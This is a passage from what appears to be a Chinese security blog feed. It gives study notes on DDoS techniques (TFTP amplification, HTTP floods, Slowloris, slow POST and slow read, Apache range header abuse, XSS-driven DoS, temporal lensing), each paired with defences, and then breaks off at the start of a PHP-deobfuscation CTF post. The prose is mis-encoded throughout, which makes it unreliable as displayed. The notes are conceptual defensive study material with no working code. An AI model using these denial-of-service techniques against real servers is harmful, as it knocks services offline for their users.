è¾“åè®®ï¼‰ï¼Œä½¿ç”¨<code>UDP 69ç«¯å£</code>è¿›è¡Œé€šä¿¡ï¼Œç”±äºTFTPä½¿ç”¨çš„æ˜¯ä¸å¯é çš„UDPåè®®ï¼Œæ‰€ä»¥ä»–ä¸èƒ½ç¡®ä¿å‘é€çš„ä»»ä½•æŠ¥æ–‡éƒ½èƒ½çœŸæ­£åˆ°è¾¾ç›®çš„åœ°ï¼Œå› æ­¤ä»–å¿…é¡»ä½¿ç”¨å®šæ—¶å™¨æ¥æ£€æµ‹å¹¶é‡ä¼ æŠ¥æ–‡ï¼Œä»¥ä¸‹æ˜¯TFTPä¼ è¾“æ–‡ä»¶è¿‡ç¨‹å›¾</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" data-fancybox="group" data-caption="ddos_18" class="fancybox"><img alt="ddos_18" title="ddos_18" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_18.png" class="lazyload"></a></p><h3 id="è¶…æ—¶é‡ä¼ æœºåˆ¶"><a href="#è¶…æ—¶é‡ä¼ æœºåˆ¶" class="headerlink" title="è¶…æ—¶é‡ä¼ æœºåˆ¶"></a>è¶…æ—¶é‡ä¼ æœºåˆ¶</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" data-fancybox="group" data-caption="ddos_19" class="fancybox"><img alt="ddos_19" title="ddos_19" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_19.png" class="lazyload"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œ<strong>TFTPåè®®</strong> å°†æ•°æ®åˆ†æˆå¥½å¤šä¸ªæ•°æ®å—è¿›è¡Œä¼ è¾“ï¼Œæ¯ä¸ªæ•°æ®å—æœ€å¤§ä¸º <strong>512å­—èŠ‚</strong>ï¼Œå®¢æˆ·ç«¯åœ¨æ¥å—åˆ°æ•°æ®å—æ—¶ï¼Œéœ€è¦ç»™æœåŠ¡å™¨ç«¯è¿”å›ä¸€ä¸ªACKç¡®è®¤æŠ¥æ–‡ï¼Œç„¶åæ‰ä¼šç»§ç»­ä¼ è¾“ä¸‹ä¸€ä¸ªæŠ¥æ–‡ã€‚è‹¥æœåŠ¡å™¨æ²¡æœ‰æ”¶åˆ°å®¢æˆ·ç«¯å‘æ¥ACKæŠ¥æ–‡ï¼Œåˆ™åœ¨æ—¶é—´åˆ°è¾¾è¶…æ—¶è®¡æ•°å™¨æ—¶ï¼Œä¾¿ä¼šå¼€å¯é‡ä¼ æœºåˆ¶ï¼Œè¿™ä¹Ÿå°±æ˜¯æ”»å‡»åˆ©ç”¨ç‚¹ã€‚</p><p>æ”»å‡»è€…åˆ©ç”¨TFTPåè®®ä¸Šçš„ç¼ºé™·ï¼Œä¼ªé€ æºåœ°å€å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼ŒæœåŠ¡å™¨å›å¤çš„ç¬¬1ä¸ªdataæ•°æ®åŒ…åæ— æ³•æ”¶åˆ°å®¢æˆ·ç«¯å‘é€çš„ACKã€‚æ­¤æ—¶TFTPå°±ä¼šåˆ©ç”¨ä»–çš„é‡ä¼ æœºåˆ¶ï¼Œå®šæ—¶é‡ä¼ ç¬¬1ä¸ªdataæ•°æ®åŒ…ï¼Œå½“æ”»å‡»è€…å‘å‡ºå¤§é‡çš„è¿™ç§è¯·æ±‚æ—¶ï¼ŒTFTPæ”¾å¤§æ”»å‡»ä¹Ÿå°±å‘ç”Ÿäº†ã€‚</p><h3 id="TFTP-æ”¾å¤§æ”»å‡»ç¤ºæ„å›¾"><a href="#TFTP-æ”¾å¤§æ”»å‡»ç¤ºæ„å›¾" class="headerlink" title="TFTP æ”¾å¤§æ”»å‡»ç¤ºæ„å›¾"></a>TFTP æ”¾å¤§æ”»å‡»ç¤ºæ„å›¾</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" title="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_20.png" class="lazyload"></a></p><p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p><ul><li>ä¸å°†TFTPæœåŠ¡å™¨æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼›</li><li>å¯¹æµç»TFTPæœåŠ¡çš„æµé‡è¿›è¡Œå…¥ä¾µæ£€æµ‹ï¼›</li><li>å°†é‡ä¼ ï¼ˆæ•°æ®åŒ…ï¼‰ç‡è®¾ç½®ä¸º1ï¼›</li><li>åªä¸ºä¿¡ä»»åŸŸå†…çš„ä¸»æœºæä¾›æœåŠ¡ã€‚</li></ul><hr><h2 id="CC-æ”»å‡»-é‡ç‚¹"><a href="#CC-æ”»å‡»-é‡ç‚¹" class="headerlink" title="CC æ”»å‡» (é‡ç‚¹)"></a>CC æ”»å‡» (é‡ç‚¹)</h2><p><strong>CCæ”»å‡» (ChallengeCollapsar)</strong> åˆç§°ä½œ <code>HTTP æ³›æ´ªæ”»å‡»</code>ï¼Œå…¶åŸç†æ˜¯æ”»å‡»è€…æ§åˆ¶è‚‰é¸¡ã€åƒµå°¸ç½‘ç»œæˆ–ä½¿ç”¨ä»£ç†æœåŠ¡å™¨ï¼Œä¸åœåœ°å‘ç›®æ ‡çš„webæœåŠ¡å‘é€å¤§é‡åˆæ³•è¯·æ±‚ï¼Œä½¿å¾—æ­£å¸¸ç”¨æˆ·çš„webè¯·æ±‚å¤„ç†ç¼“æ…¢ç”šè‡³å¾—ä¸åˆ°å¤„ç†ï¼Œåˆ¶é€ å¤§é‡çš„åå°æ•°æ®åº“æŸ¥è¯¢åŠ¨ä½œï¼Œæ¶ˆè€—ç›®æ ‡CPUèµ„æºï¼Œæœ€ç»ˆå¯¼è‡´æœåŠ¡å™¨å®•æœºå´©æºƒã€‚</p><p>è¿™ç§æ”»å‡»æ–¹å¼ä¸éœ€è¦å¾ˆå¤§çš„å¸¦å®½ï¼Œä¸”æ— æ³•ä½¿ç”¨ä¼ªé€ IPåœ°å€è¿›è¡Œæ”»å‡»ï¼Œéœ€è¦çœŸå®çš„æœºå™¨ä¸webæœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œ<strong><font color="6495ED">å› ä¸ºHTTPåè®®æ˜¯å»ºç«‹åœ¨TCPåè®®ä¸Šï¼Œå¿…é¡»å…ˆè¿›è¡ŒTCPä¸‰æ¬¡æ¡æ‰‹æ‰èƒ½è¿›è¡ŒHTTPé€šä¿¡ã€‚å¦‚æœç›®æ ‡webæœåŠ¡å™¨æ”¯æŒHTTPSï¼Œé‚£ä¹ˆå‘èµ·çš„HTTPSæ³›æ´ªæ”»å‡»è¿˜èƒ½ç©¿é€ä¸€äº›é˜²æŠ¤è®¾å¤‡ã€‚</font></strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" data-fancybox="group" data-caption="ddos_20" class="fancybox"><img alt="ddos_20" title="ddos_20" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_21.png" class="lazyload"></a></p><p><strong>é˜²å¾¡æ–¹æ¡ˆ</strong>ï¼š</p><ul><li>å¿…è¦æ—¶å°†ç½‘é¡µåšæˆé™æ€ï¼Œå‡å°‘æ•°æ®åº“çš„ä½¿ç”¨ï¼›</li><li>é™åˆ¶è¿æ¥æ•°é‡ï¼›ä¿®æ”¹æœ€å¤§è¶…æ—¶æ—¶é—´ï¼›</li><li>è®©ç”¨æˆ·æ‰‹åŠ¨è¾“å…¥éªŒè¯ç ï¼›</li><li>åœ¨responseæŠ¥æ–‡ä¸­æ·»åŠ ç‰¹æ®Šå­—æ®µï¼ŒéªŒè¯IPåˆæ³•æ€§ï¼›</li><li>å±è”½é¢‘ç¹è®¿é—®æœåŠ¡å™¨çš„ä¸»æœºIPã€‚</li></ul><hr><h2 id="HTTP-æ…¢é€Ÿæ”»å‡»"><a href="#HTTP-æ…¢é€Ÿæ”»å‡»" class="headerlink" title="HTTP æ…¢é€Ÿæ”»å‡»"></a>HTTP æ…¢é€Ÿæ”»å‡»</h2><p><code>Slow HTTP Dos Attacks</code>ï¼ˆæ…¢é€ŸHTTPæ‹’ç»æœåŠ¡æ”»å‡»ï¼‰ï¼Œé»‘å®¢æ¨¡æ‹Ÿæ­£å¸¸ç”¨æˆ·å‘webæœåŠ¡å™¨å‘é€æ…¢é€Ÿhttpè¯·æ±‚ï¼Œç”±äºæ˜¯æ…¢é€Ÿçš„ï¼ŒæœåŠ¡å™¨ç«¯éœ€è¦ä¿æŒè¿æ¥èµ„æºï¼Œç›´åˆ°æ•°æ®ä¼ è¾“ç»“æŸæˆ–è¯·æ±‚ç»“æŸæ‰å¯é‡Šæ”¾è¿æ¥ã€‚å½“æœåŠ¡å™¨ç«¯å»ºç«‹äº†å¤§é‡è¿™æ ·çš„æ…¢é€Ÿè¿æ¥ï¼Œå°±ä¼šå¯¼è‡´æœåŠ¡å™¨æ‹’ç»æœåŠ¡ã€‚è¿™ç§æ”»å‡»å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼Œ<strong><font color="6495ED">ä¸€ç±»æ˜¯å®¢æˆ·ç«¯å‘æ•°æ®ï¼Œå¦ä¸€ç±»æ˜¯å®¢æˆ·ç«¯è¯»å–æœåŠ¡å™¨å‘æ¥çš„æ•°æ®</font></strong>ã€‚HTTPæ…¢é€Ÿæ”»å‡»å¯¹åŸºäºçº¿ç¨‹å¤„ç†çš„webæœåŠ¡å™¨å½±å“æ˜¾è‘—ï¼Œå¦‚ <code>apacheã€dhttpd</code>ï¼Œè€Œå¯¹åŸºäºäº‹ä»¶å¤„ç†çš„webæœåŠ¡å™¨å½±å“ä¸å¤§ï¼Œå¦‚ <code>ngixã€lighttpdã€‚HTTP</code> æ…¢é€Ÿæ”»å‡»è¿˜å¯ä»¥ç»†åˆ†æˆä»¥ä¸‹å‡ ç§æ”»å‡»æ–¹å¼ã€‚</p><h3 id="Slow-Loris-Attack"><a href="#Slow-Loris-Attack" class="headerlink" title="Slow Loris Attack"></a>Slow Loris Attack</h3><p>HTTPåè®®è§„å®šè¯·æ±‚å¤´ä»¥ä¸€ä¸ªç©ºè¡Œç»“æŸï¼Œæ‰€ä»¥ <code>å®Œæ•´çš„httpè¯·æ±‚å¤´</code> ç»“å°¾æ˜¯ <code>\r\n\r\n</code>ã€‚<br>ç„¶è€Œä½¿ç”¨éæ­£å¸¸çš„ <code>\r\n</code> æ¥ç»“å°¾ï¼Œå°±ä¼šå¯¼è‡´æœåŠ¡ç«¯è®¤ä¸ºæˆ‘ä»¬çš„è¯·æ±‚å¤´è¿˜æ²¡ç»“æŸï¼Œç­‰å¾…æˆ‘ä»¬ç»§ç»­å‘é€æ•°æ®ç›´åˆ°è¶…æ—¶æ—¶é—´ã€‚</p><p>ä¸¤ç§è¯·æ±‚å¤´åŒºåˆ«å¦‚ä¸‹ï¼Œ<strong><font color="6495ED">CRLF</font>(Carriage Return Line Feed)</strong> è¡¨ç¤ºå›è½¦æ¢è¡Œ</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" data-fancybox="group" data-caption="ddos_22" class="fancybox"><img alt="ddos_22" title="ddos_22" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_22.png" class="lazyload"></a></p><h3 id="Slow-Post-Attack"><a href="#Slow-Post-Attack" class="headerlink" title="Slow Post Attack"></a>Slow Post Attack</h3><p>åœ¨httpå¤´éƒ¨ä¿¡æ¯ï¼Œå¯ä»¥ä½¿ç”¨ <code>content-length</code> å£°æ˜HTTPæ¶ˆæ¯å®ä½“çš„ä¼ è¾“é•¿åº¦ï¼ŒæœåŠ¡å™¨ç«¯ä¼šå°† <code>content-length</code> çš„å€¼ä½œä¸º <code>HTTP BODY</code> çš„é•¿åº¦ã€‚(è¿™ä¸ªå¥½åƒStruts2 æœ‰ç±»ä¼¼çš„æ¼æ´)</p><p>åˆ©ç”¨è¿™ä¸€ç‰¹ç‚¹ï¼Œæ”»å‡»è€…æŠŠ <code>content-length</code> è®¾ç½®å¾—å¾ˆå¤§çš„ï¼Œç„¶åç¼“æ…¢å‘é€æ•°æ®éƒ¨åˆ†ï¼Œæ¯”å¦‚ä¸€æ¬¡åªå‘é€ä¸€ä¸ªå­—èŠ‚ï¼Œè¿™æ ·æœåŠ¡å™¨ç«¯å°±è¦ä¸€ç›´ä¿æŒè¿æ¥ï¼Œç›´åˆ°å®¢æˆ·ç«¯ä¼ å®Œæ‰€æœ‰çš„æ•°æ®ã€‚</p><h3 id="Slow-Read-Attack"><a href="#Slow-Read-Attack" class="headerlink" title="Slow Read Attack"></a>Slow Read Attack</h3><p>æ”»å‡»è€…å‘é€ä¸€ä¸ªå®Œæ•´çš„HTTPæ•°æ®è¯·æ±‚ï¼Œä¹‹åæœåŠ¡å™¨ä¼šç»™å‡ºå“åº”ï¼Œè¿™æ—¶æ”»å‡»è€…åœ¨å°†è‡ªå·±çš„TCPçª—å£å¤§å°è®¾ç½®çš„å¾ˆå°ï¼ŒæœåŠ¡å™¨ä¼šæ ¹æ®å®¢æˆ·çš„TCPçª—å£å¤§å°æ¥ä¼ é€æ•°æ®ã€‚</p><p>ç”±äºå®¢æˆ·ç«¯çš„TCPçª—å£å¾ˆå°ï¼ŒæœåŠ¡å™¨åªèƒ½ç¼“æ…¢çš„ä¼ è¾“æ•°æ®ç»™å®¢æˆ·ç«¯ã€‚å½“å»ºç«‹å¤§é‡çš„è¿™ç§è¿æ¥æ—¶ï¼Œwebåº”ç”¨çš„å¹¶å‘è¿æ¥æ± å°†è¢«è€—å°½ï¼Œæœ€ç»ˆå¯¼è‡´æ‹’ç»æœåŠ¡ã€‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" data-fancybox="group" data-caption="ddos_23" class="fancybox"><img alt="ddos_23" title="ddos_23" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_23.png" class="lazyload"></a></p><h3 id="Apache-range-header-Attack"><a href="#Apache-range-header-Attack" class="headerlink" title="Apache range header Attack"></a>Apache range header Attack</h3><p>è¿™ç§æ”»å‡»æ–¹å¼åªé’ˆå¯¹ <code>Apache</code>ï¼Œå½“å®¢æˆ·ç«¯ä¼ è¾“å¤§æ–‡ä»¶æ—¶ä¼šæœ‰ <code>rangeå­—æ®µ</code>ï¼Œè¡¨ç¤ºå°†å¤§æ–‡ä»¶åˆ†æ®µï¼Œåˆ†æˆå‡ ä¸ªå°æ®µè¿›è¡Œä¼ è¾“ã€‚<br>ä¾‹å¦‚æ”»å‡»è€…å°†ä¸€ä¸ªæ–‡ä»¶æŒ‰ç…§ä¸€ä¸ªå­—èŠ‚ä¸€æ®µï¼Œåˆ†æˆå¥½å¤šæ®µï¼Œè¿™æ ·å°±ä¼šé€ æˆä¼ è¾“æ•°æ®ç¼“æ…¢ï¼Œé•¿æ—¶é—´å ç”¨è¿æ¥ï¼Œæ¶ˆè€—æœåŠ¡å™¨CPUå’Œå†…å­˜èµ„æºã€‚</p><h3 id="è¯´ä¸€ä¸‹-Apache-çš„é˜²æŠ¤"><a href="#è¯´ä¸€ä¸‹-Apache-çš„é˜²æŠ¤" class="headerlink" title="è¯´ä¸€ä¸‹ Apache çš„é˜²æŠ¤"></a>è¯´ä¸€ä¸‹ Apache çš„é˜²æŠ¤</h3><ul><li><strong><font color="6495ED">mod_reqtimeout :</font></strong> æ§åˆ¶è¯·æ±‚æ•°æ®ä¼ è¾“çš„è¶…æ—¶æ—¶é—´åŠæœ€å°é€Ÿç‡</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" data-fancybox="group" data-caption="ddos_24" class="fancybox"><img alt="ddos_24" title="ddos_24" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_24.png" class="lazyload"></a></p><ul><li><strong><font color="6495ED">mod_qos :</font></strong> Apacheçš„ä¸€ä¸ªæœåŠ¡è´¨é‡æ§åˆ¶æ¨¡å—ï¼Œç”¨æˆ·å¯é…ç½®å„ç§ä¸åŒé˜ˆå€¼</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" data-fancybox="group" data-caption="ddos_25" class="fancybox"><img alt="ddos_25" title="ddos_25" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_25.png" class="lazyload"></a></p><ul><li><strong><font color="6495ED">mod_security :</font></strong> ä¸€ä¸ªå¼€æºçš„WAFæ¨¡å—ï¼Œæœ‰ä¸“é—¨é’ˆå¯¹æ…¢é€Ÿæ”»å‡»é˜²æŠ¤çš„è§„åˆ™</li></ul><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" data-fancybox="group" data-caption="ddos_26" class="fancybox"><img alt="ddos_26" title="ddos_26" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_26.png" class="lazyload"></a></p><p>å…¶ä»–çš„ä¸­é—´ä»¶é˜²æŠ¤æ–¹æ¡ˆï¼Œå‚è€ƒä¸‹é¢çš„é“¾æ¥</p><hr><h2 id="XSS-DOS-ï¼ˆç¨ä½œäº†è§£"><a href="#XSS-DOS-ï¼ˆç¨ä½œäº†è§£" class="headerlink" title="XSS-DOS ï¼ˆç¨ä½œäº†è§£"></a>XSS-DOS ï¼ˆç¨ä½œäº†è§£</h2><p>åˆ©ç”¨ç½‘ç«™å­˜åœ¨çš„ <code>å­˜å‚¨å‹XXSæ¼æ´</code>ï¼Œåœ¨ç½‘ç«™ä¸­æ’å…¥æ¶æ„çš„jsä»£ç ã€‚<strong><font color="6495ED">ä»£ç çš„åŠŸèƒ½æ˜¯ä¸æ–­å‘webæœåŠ¡å™¨å‘èµ·å¤§é‡è¯·æ±‚ï¼Œä»è€Œå¯¼è‡´æœåŠ¡å™¨å®•æœºï¼Œæ— æ³•å“åº”æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚ã€‚</font></strong></p><p>å®¢æˆ·ç«¯è®¿é—®å·²æ’å…¥æ¶æ„çš„javascriptä»£ç çš„é¡µé¢åï¼Œæµé‡å¦‚ä¸‹</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" data-fancybox="group" data-caption="ddos_27" class="fancybox"><img alt="ddos_27" title="ddos_27" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_27.png" class="lazyload"></a></p><p>ç”±äºè¿™ç§æ”»å‡»çš„æ˜¯ç”± <code>å­˜å‚¨å‹XSS</code>å¯¼è‡´çš„ï¼Œå› æ­¤è¦è€ƒè™‘å¦‚ä½•é˜²æŠ¤ <code>å­˜å‚¨å‹XSS</code>ã€‚</p><p><strong>é˜²æŠ¤æ–¹æ¡ˆ</strong>ï¼š</p><ul><li>å¯¹ç”¨æˆ·çš„è¾“å…¥ä»¥åŠurlå‚æ•°è¿›è¡Œç‰¹æ®Šå­—ç¬¦è¿‡æ»¤ï¼›</li><li>å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œç¼–ç è½¬æ¢ï¼›</li><li>ç»“åˆé»‘ç™½åå•æœºåˆ¶ã€‚</li></ul><h2 id="æ—¶é—´é€é•œæ”»å‡»"><a href="#æ—¶é—´é€é•œæ”»å‡»" class="headerlink" title="æ—¶é—´é€é•œæ”»å‡»"></a>æ—¶é—´é€é•œæ”»å‡»</h2><p>é€šè¿‡æ§åˆ¶ç›¸åŒæºå’Œç›¸åŒç›®çš„IPæŠ¥æ–‡ï¼Œä½¿å¾—èµ°ä¸åŒè·¯å¾„çš„æ•°æ®åŒ…ï¼Œåœ¨åŒä¸€æ—¶åˆ»åˆ°è¾¾ç›®æ ‡æœåŠ¡å™¨ï¼Œä»è€Œè¾¾åˆ°æµé‡é›†ä¸­æ”»å‡»çš„ç›®çš„ã€‚</p><p>è¿™ç§æ”»å‡»å…¶å®æˆ‘ä¹Ÿè¿˜å¼„ä¸å¤ªæ‡‚ï¼Œè¯¦ç»†ä¿¡æ¯å¯ä»¥é˜…è¯»è¿™ç¯‡paperï¼š<a href="http://icir.org/vern/papers/lensing.oak15.pdf" target="_blank" rel="noopener">Temporal Lensing and its Application in Pulsing Denial-of-Service Attacks</a>ï¼Œä»¥åŠåé¢çš„å‚è€ƒé“¾æ¥</p><h3 id="æ”»å‡»ç¤ºæ„å›¾"><a href="#æ”»å‡»ç¤ºæ„å›¾" class="headerlink" title="æ”»å‡»ç¤ºæ„å›¾"></a>æ”»å‡»ç¤ºæ„å›¾</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" data-fancybox="group" data-caption="ddos_28" class="fancybox"><img alt="ddos_28" title="ddos_28" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_28.png" class="lazyload"></a><br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" data-fancybox="group" data-caption="ddos_29" class="fancybox"><img alt="ddos_29" title="ddos_29" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ddos_29.png" class="lazyload"></a></p><p>ä¸»è¦æ‰¯ä¸€ä¸‹é˜²æŠ¤æ–¹æ¡ˆï¼šå¢åŠ æŠ–åŠ¨ï¼Œå¹²æ‰°æ”»å‡»è·¯å¾„ï¼Œä½¿å¾—æ•°æ®åŒ…æ— æ³•é¢„æœŸåˆ°è¾¾ï¼›ç”±è¿è¥å•†ç¦æ­¢æºè·¯ç”±ã€‚<br>å…¶ä»–é˜²å¾¡æªæ–½ï¼š</p><ul><li>é‡‡ç”¨é«˜æ€§èƒ½çš„ç½‘ç»œè®¾å¤‡ï¼›å……è¶³çš„ç½‘ç»œå¸¦å®½ä¿è¯ï¼›å‡çº§ä¸»æœºæœåŠ¡å™¨ç¡¬ä»¶ï¼›</li><li><strong>é¿å…å°†æœåŠ¡å™¨çš„çœŸå®IPæš´éœ²åœ¨å…¬ç½‘ä¸­</strong>ï¼›</li><li>ä½¿ç”¨CDNå¯¹æµé‡è¿›è¡Œç¨€é‡Šï¼Œå½“å¤§æµé‡ç¨€é‡Šåˆ°å„ä¸ªCDNèŠ‚ç‚¹æ—¶ï¼Œå†å¯¹æµé‡è¿›è¡Œæ¸…æ´—ï¼Œä»è€Œè¾¾åˆ°é˜²æŠ¤æºç«™çš„ç›®çš„ã€‚ç„¶è€Œè¿™ç§é˜²å¾¡æ–¹å¼åªèƒ½ç”¨åœ¨å¯¹åŸŸåå‘èµ·çš„DDOSæ”»å‡»ï¼Œå¦‚æœæ”»å‡»è€…ç›´æ¥å¯¹IPè¿›è¡Œæ”»å‡»ï¼Œåˆ™éœ€è¦ä½¿ç”¨ <code>anycastæŠ€æœ¯</code> æ¥é˜²å¾¡ã€‚</li></ul><hr><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://kb.mazebolt.com/knowledgebase/ack-flood/" target="_blank" rel="noopener">ack flood</a><br><a href="https://zhidao.baidu.com/question/1429836881297848579.html" target="_blank" rel="noopener">DDoSå’Œccçš„åŒºåˆ«</a><br><a href="https://www.jianshu.com/p/dff5a0d537d8" target="_blank" rel="noopener">ä»€ä¹ˆæ˜¯ccæ”»å‡»</a><br><a href="https://www.imperva.com/learn/application-security/" target="_blank" rel="noopener">DDoSçš„å¤§éƒ¨åˆ†æ”»å‡»å½¢å¼</a><br><a href="https://www.acunetix.com/blog/articles/slow-http-dos-attacks-mitigate-apache-http-server/" target="_blank" rel="noopener">Mitigate Slow HTTP GET/POST Vulnerabilities in the Apache HTTP Server</a><br><a href="https://blog.qualys.com/securitylabs/2011/11/02/how-to-protect-against-slow-http-attacks" target="_blank" rel="noopener">How to Protect Against Slow HTTP Attacks</a><br><a href="https://mp.weixin.qq.com/s?__biz=MzI2NjUwNjU4OA==&mid=2247483685&idx=1&sn=8ac38ff22d571bbbf7716cb9e83b9b35&chksm=ea8c5916ddfbd00008d9b28e22fccba8c201ce78c70c2d78d10ee732f22a39ccf46d4b197634&mpshare=1&scene=23&srcid=0831Wr5YJPYzSrQU6gnfGVd0" target="_blank" rel="noopener">æ—¶é—´é€é•œåŠå…¶åœ¨è„‰å†²æ‹’ç»æœåŠ¡æ”»å‡»çš„åº”ç”¨</a><br>ã€Šç ´åä¹‹ç‹_DDoSæ”»å‡»ä¸é˜²èŒƒæ·±åº¦å‰–æã€‹(ä¹¦ç±ç½‘ä¸Šæœ‰ç”µå­æ¡£)</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="çæ‰¯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="æ¸—é€" scheme="https://manayakko.github.io/yakko117/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>æµ…æPHPæ··æ·†åŠ å¯†</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/26/php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/26/php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/</id>
    <published>2020-03-26T03:13:59.906Z</published>
    <updated>2020-03-28T03:39:07.086Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>é€šè¿‡ä¸€é“é¢˜ï¼Œæ¥çœ‹ä¸€ä¸‹php æ··æ·†åŠ å¯†è§£å¯†åŸç†å’Œåˆ†æ<br>é¢˜ç›®æ¥è‡ª [PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥<br>è¿™å‡ å¤©å¤©å¤©ç›¯ç€è¿™äº›é¬¼ï¼Œçœ¼ç›éƒ½çœ‹çäº†<br>é¢˜ç›®æ˜¯ä¸ªå¥½é¢˜ç›®ï¼Œæˆ‘çœ‹äº†Virinkå¸ˆå‚…å’Œè…¹é»‘å¸ˆå‚…çš„é¢˜è§£ä»ç„¶å‘ç°è‡ªå·±å¾ˆå¤šä¸æ‡‚ã€‚è¿˜æ˜¯å¤ªèœäº†<br>å¥½å¥½å­¦ä¹ ï¼Œå¥½å¥½å­¦ä¹ </p><hr><h1 id="PWNHUB-å…¬å¼€èµ›-2018-å‚»-fufu-çš„å·¥ä½œæ—¥"><a href="#PWNHUB-å…¬å¼€èµ›-2018-å‚»-fufu-çš„å·¥ä½œæ—¥" class="headerlink" title="[PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥"></a>[PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥</h1><p>ç‚¹å¼€é¢˜ç›®ï¼Œæ˜¯ä¸ªä¸Šä¼ ï¼Œé€šè¿‡æ‰«æåå°ï¼Œå‘ç°å­˜åœ¨å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œå¾—åˆ°äº† <code>index.php.bak</code><br>æ–‡ä»¶æ‰“å¼€ï¼Œå‘ç°å…¨æ˜¯ä¹±ç ï¼Œä½†æ˜¯æ³¨æ„åˆ°äº†ä¸€äº›ç»†èŠ‚å› æ­¤æˆ‘ä»¬æ¥å¯¹æºç è¿›è¡Œä¸€ä¸‹åˆ†æ</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" data-fancybox="group" data-caption="decode1" class="fancybox"><img alt="decode1" title="decode1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" class="lazyload"></a></p><p>é¦–å…ˆæ˜¯å¼€å¤´çš„åŠ å¯†æºç½‘ç«™</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* PHP Encode by  http://Www.PHPJiaMi.Com/ */</span></span><br></pre></td></tr></table></figure></div><p>ç„¶åå¯ä»¥çœ‹åˆ°æœ‰é¢œè‰²çš„ä»£ç æœ€æœ«å°¾æœ‰ <code>return *** ?&gt;</code> æ¥ç»“æŸè„šæœ¬è¿è¡Œï¼Œè¿™è¯´æ˜ç»“æŸæ ‡ç­¾åé¢çš„æ•°æ®éƒ½ä¸ä¼šè¢«æ­£å¸¸è¾“å‡ºï¼Œåé¢æå¯èƒ½æ˜¯<code>index.php</code> æºç ï¼Œè€Œå‰é¢çš„ php ä»£ç åªæ˜¯ç”¨æ¥åŠ å¯†çš„ã€‚</p><hr><h2 id="è§£ç å‡†å¤‡"><a href="#è§£ç å‡†å¤‡" class="headerlink" title="è§£ç å‡†å¤‡"></a>è§£ç å‡†å¤‡</h2><p>å› ä¸ºæˆ‘çš„ <code>IDE</code> æ˜¯ 